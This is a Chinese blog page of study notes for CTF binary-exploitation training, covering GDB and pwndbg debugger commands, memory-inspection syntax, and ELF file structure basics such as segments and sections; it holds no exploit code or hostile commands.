<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>文档学习 | MatrweのBlog</title><meta name="author" content="Matrwe"><meta name="copyright" content="Matrwe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="二轮文档自学">
<meta property="og:type" content="article">
<meta property="og:title" content="文档学习">
<meta property="og:url" content="https://imatrwe.github.io/2024/10/15/%E6%96%87%E6%A1%A3%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="MatrweのBlog">
<meta property="og:description" content="二轮文档自学">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131914425.jpg">
<meta property="article:published_time" content="2024-10-15T07:46:11.132Z">
<meta property="article:modified_time" content="2024-10-22T07:20:43.104Z">
<meta property="article:author" content="Matrwe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131914425.jpg"><link rel="shortcut icon" href="/img/avatar.png"><link rel="canonical" href="https://imatrwe.github.io/2024/10/15/%E6%96%87%E6%A1%A3%E5%AD%A6%E4%B9%A0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        if (name && globalFn[key][name]) return
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '文档学习',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-10-22 15:20:43'
}</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131914425.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">MatrweのBlog</span></a><a class="nav-page-title" href="/"><span class="site-name">文档学习</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">文档学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-10-15T07:46:11.132Z" title="发表于 2024-10-15 15:46:11">2024-10-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-10-22T07:20:43.104Z" title="更新于 2024-10-22 15:20:43">2024-10-22</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="PWN工具"><a href="#PWN工具" class="headerlink" title="PWN工具"></a>PWN工具</h1><h2 id="pwn工具"><a href="#pwn工具" class="headerlink" title="pwn工具"></a>pwn工具</h2><p> <img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161025300.png" alt="image-20241016102519205"></p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161113384.png" alt="image-20241016111303358"></p>
<h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><blockquote>
<p>调试可执行文件</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用gcc编译test.c文件，结果文件命名为test.out，并且加入debugger信息</span></span><br><span class="line">gcc -g ./test.c -o test.out </span><br><span class="line"></span><br><span class="line">gdb ./test.out</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">断点</span></span><br><span class="line">b main</span><br><span class="line">b path:line</span><br><span class="line">d num # 删除num号断点</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行</span></span><br><span class="line">r</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不进函数单步 next</span></span><br><span class="line">n</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进函数单步</span></span><br><span class="line">f</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">结束</span></span><br><span class="line">k</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">继续到下一个断点</span></span><br><span class="line">c</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">监视变量</span></span><br><span class="line">watch i # 直到变量i变化</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">信息查看</span></span><br><span class="line">info b # 查看断点</span><br><span class="line">info r # 查看寄存器</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看变量</span></span><br><span class="line">p i</span><br><span class="line">p/x #  16进制打印</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">layout，展示</span></span><br><span class="line">layout src # 展示源码</span><br><span class="line">ctrl x + a #关闭/打开</span><br><span class="line"></span><br><span class="line">layout asm # 查看汇编，si来单步跳转</span><br></pre></td></tr></table></figure>

<h2 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h2><h3 id="什么是pwndbg"><a href="#什么是pwndbg" class="headerlink" title="什么是pwndbg?"></a>什么是pwndbg?</h3><p>它是<code>gdb</code>的一个插件，增加了许多功能，来帮助pwn手可以快速寻找到所需要的信息，除了<code>pwndbg</code>之外还有<code>peda</code>、<code>gef</code>等工具可以用来协助进行调试。</p>
<h3 id="如何给pwndbg分屏"><a href="#如何给pwndbg分屏" class="headerlink" title="如何给pwndbg分屏?"></a>如何给pwndbg分屏?</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.gdbinit</span><br><span class="line">set context-output /dev/pts/2 # 这里修改成2，那么就会在第二个终端显示信息</span><br></pre></td></tr></table></figure>

<h3 id="pwndbg的基础操作"><a href="#pwndbg的基础操作" class="headerlink" title="pwndbg的基础操作:"></a>pwndbg的基础操作:</h3><p>启动调试:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./文件名</span><br><span class="line">比如:gdb ./pwn</span><br></pre></td></tr></table></figure>

<p>如果我们已经成功安装了<code>pwndbg</code>，那么打开<code>gdb</code>之后会显示<code>pwndbg&gt;</code><br>这样的提示符号，否则是<code>gdb&gt;</code></p>
<p>基础操作:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">start</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开始运行，会停留在start函数上(start函数是main函数之前的一个函数)</span> </span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">q</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">退出调试</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">r</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从头运行程序直到遇到断点,没有断点则会一直运行到结束</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">c</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">继续执行程序直到遇到断点，没有断点则会一直运行到结束</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">n</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">单步步过，n不会进入一个小函数</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">ni</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用，同n，但是是汇编层面的一步</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">s</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">步入，比如遇到一个call 什么什么函数，s会进入看看怎么个事</span> </span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">si</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用，同s，但是是汇编层面的一步</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">fini</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">快速运行结束当前函数</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">context</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新打印页面信息</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">b function_name</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">比如: b <span class="built_in">read</span> 在<span class="built_in">read</span>函数上下断点，运行到<span class="built_in">read</span>函数的时候就会停止</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">b *(&amp;function_name+offset)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">比如: b *(&amp;<span class="built_in">read</span> + 10) 在<span class="built_in">read</span>函数+10的地址上下断点，运行到这个地址的时候就会停止</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">b *0xaddr</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">比如: b *0x408010 那么程序运行到0x408010这个地址的时候就会停止</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">i b</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看断点信息，哪些地方打了断点</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">delete &lt;断点序号&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除断点序号对应的断点,单独一个delete会删除所有断点</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">i r</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看所有寄存器中存储的数据</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">i r &lt;registers&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看具体某一个寄存器的值 比如: pwndbg&gt; i r rax</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">stack &lt;int&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看栈中的信息，具体数量填在stack后面，比如: stack 50</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">search &lt;string&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在程序中查看字符串，可以查看自己输入的信息被存在什么地方了</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> $&lt;rigister&gt; = &lt;int&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用<span class="built_in">set</span>来给寄存器设置自定义的值</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bt</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看我们当前这个函数的上一个函数是什么</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看程序各个段的位置以及权限等信息</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">elf</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看elf文件信息</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看释放的堆块</span></span><br><span class="line">**************************************************</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看正在使用的堆块</span></span><br><span class="line">**************************************************</span><br></pre></td></tr></table></figure>

<h3 id="命令和p命令的使用"><a href="#命令和p命令的使用" class="headerlink" title="命令和p命令的使用:"></a>命令和p命令的使用:</h3><h4 id="1-x-命令"><a href="#1-x-命令" class="headerlink" title="1.x 命令"></a>1.<code>x</code> 命令</h4><p><code>x</code> 命令用于查看内存中的数据。它可以显示指定地址或变量所占内存的内容。其基本语法如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/[n][f][u] addr</span><br></pre></td></tr></table></figure>

<h5 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h5><ul>
<li><code>n</code>：可选，表示要显示的单元数量，默认为1。</li>
<li><code>f</code>：可选，表示显示的格式，常见格式包括：<ul>
<li><code>d</code>：十进制整数</li>
<li><code>x</code>：十六进制</li>
<li><code>o</code>：八进制</li>
<li><code>c</code>：字符</li>
<li><code>f</code>：浮点数</li>
</ul>
</li>
<li><code>u</code>：可选，表示数据单位，常见单位包括：<ul>
<li><code>b</code>：字节</li>
<li><code>h</code>：半字（2 字节）</li>
<li><code>w</code>：字（4 字节）</li>
<li><code>g</code>：巨字（8 字节）</li>
</ul>
</li>
</ul>
<h5 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h5><ol>
<li><h6 id="查看内存地址的内容："><a href="#查看内存地址的内容：" class="headerlink" title="查看内存地址的内容："></a><strong>查看内存地址的内容</strong>：</h6></li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/10x 0x7fffffffe000</span><br></pre></td></tr></table></figure>

<p>以上命令将以十六进制格式显示从 <code>0x7fffffffe000</code> 开始的10个字节的内容。</p>
<ol start="2">
<li><h6 id="查看变量的内容："><a href="#查看变量的内容：" class="headerlink" title="查看变量的内容："></a><strong>查看变量的内容</strong>：</h6></li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/4d my_array</span><br></pre></td></tr></table></figure>

<p>该命令将以十进制格式查看 <code>my_array</code> 数组的前4个元素。</p>
<h4 id="2-p-命令"><a href="#2-p-命令" class="headerlink" title="2. p 命令"></a>2. <code>p</code> 命令</h4><p><code>p</code> 命令用于打印变量的值，通常用于查看变量的当前状态。其基本语法如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p [expression]</span><br></pre></td></tr></table></figure>

<h5 id="参数说明：-1"><a href="#参数说明：-1" class="headerlink" title="参数说明："></a>参数说明：</h5><ul>
<li><code>expression</code>：要打印的变量名或表达式。</li>
</ul>
<h5 id="示例：-1"><a href="#示例：-1" class="headerlink" title="示例："></a>示例：</h5><ol>
<li><h6 id="打印简单变量："><a href="#打印简单变量：" class="headerlink" title="打印简单变量："></a><strong>打印简单变量</strong>：</h6></li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p my_variable</span><br></pre></td></tr></table></figure>

<p>该命令将输出 <code>my_variable</code> 的当前值。</p>
<ol start="2">
<li><h6 id="打印结构体成员："><a href="#打印结构体成员：" class="headerlink" title="打印结构体成员："></a><strong>打印结构体成员</strong>：</h6></li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p my_struct.member</span><br></pre></td></tr></table></figure>

<p>此命令将输出结构体 <code>my_struct</code> 中 <code>member</code> 的值。</p>
<ol start="3">
<li><h6 id="打印表达式的值："><a href="#打印表达式的值：" class="headerlink" title="打印表达式的值："></a><strong>打印表达式的值</strong>：</h6></li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p my_variable + 10</span><br></pre></td></tr></table></figure>

<p>该命令将输出 <code>my_variable</code> 的值加上10的结果</p>
<h4 id="3-常见用法示例"><a href="#3-常见用法示例" class="headerlink" title="3. 常见用法示例"></a>3. 常见用法示例</h4><h5 id="3-1-打印变量地址"><a href="#3-1-打印变量地址" class="headerlink" title="3.1 打印变量地址"></a><strong>3.1 打印变量地址</strong></h5><p>使用 <code>&amp;</code> 操作符可以打印变量的地址：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p &amp;my_variable</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="3-2-观察数组"><a href="#3-2-观察数组" class="headerlink" title="3.2 观察数组"></a><strong>3.2 观察数组</strong></h5><p>结合 <code>p</code> 和 <code>x</code> 命令，可以更好地观察数组内容：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/10d my_array p my_array[0]</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="3-3-打印指针指向的值"><a href="#3-3-打印指针指向的值" class="headerlink" title="3.3 打印指针指向的值"></a><strong>3.3 打印指针指向的值</strong></h5><p>如果打印指针指向的内容，可以使用 <code>*</code>：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p *my_pointer</span><br></pre></td></tr></table></figure>

<p>在 <code>gdb</code> 中是可以设置地址随机化开关，需要的时候可以关闭，来帮助我们调试</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> disable-randomization on	<span class="comment"># 开</span></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> disable-randomization off	<span class="comment"># 关</span></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">show disable-randomization		<span class="comment"># 查</span></span></span><br></pre></td></tr></table></figure>

<h1 id="二进制基础"><a href="#二进制基础" class="headerlink" title="二进制基础"></a>二进制基础</h1><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161623657.png" alt="image-20241016102817232"></p>
<h2 id="硬件知识"><a href="#硬件知识" class="headerlink" title="硬件知识"></a>硬件知识</h2><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161656236.png" alt="image-20241016165612168"></p>
<h3 id="大端序与小端序"><a href="#大端序与小端序" class="headerlink" title="大端序与小端序"></a>大端序与小端序</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161401991.png" alt="image-20241016140138922"></p>
<h2 id="可执行文件"><a href="#可执行文件" class="headerlink" title="可执行文件"></a>可执行文件</h2><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161654275.png" alt="image-20241016165451184"></p>
<h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161044136.png" alt="image-20241016104436079"></p>
<blockquote>
<p>磁盘里的才叫ELF，到了内存中就变成virtual memory进程了</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161051944.png" alt="image-20241016105138773"></p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161054011.png" alt="image-20241016105407919"></p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161054691.png" alt="image-20241016105423621"></p>
<h3 id="段（segment）和节（section）"><a href="#段（segment）和节（section）" class="headerlink" title="段（segment）和节（section）"></a>段（segment）和节（section）</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161153825.png" alt="image-20241016115310776"></p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161156174.png" alt="image-20241016115652120"></p>
<blockquote>
<p>不可写的数据放在text段 </p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161629087.png" alt="image-20241016162918018"></p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161647461.png" alt="image-20241016164758380"></p>
<h4 id="节"><a href="#节" class="headerlink" title="节"></a>节</h4><ul>
<li><code>.bss</code> 节用于存储<strong>未初始化的全局变量和静态变量</strong>。</li>
<li><code>.text</code> 节存储程序的<strong>可执行指令</strong>，即代码本身。</li>
<li><code>.data</code> 节用于存储<strong>已初始化的全局变量和静态变量</strong>。</li>
<li><code>.rodata</code> 节存储<strong>只读数据</strong>，如常量字符串、常量数组等。</li>
<li><code>.plt</code> 节用于支持动态链接库的函数调用。</li>
<li><code>.got</code> 节存储了全局变量的地址，主要用于实现动态链接。</li>
